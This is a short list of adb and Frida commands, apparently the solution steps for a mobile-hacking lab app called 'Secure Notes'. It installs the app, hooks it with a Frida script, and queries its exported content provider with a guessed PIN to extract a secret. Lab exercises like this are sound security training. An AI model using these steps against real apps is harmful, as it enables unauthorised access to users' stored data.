adb install com.mobilehackinglab.securenotes.apk
adb shell 'am start -n com.mobilehackinglab.securenotes/.MainActivity'
frida -U -l com.mobilehackinglab.securenotes.js 'Secure Notes'
adb shell 'content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where "pin=2580"'

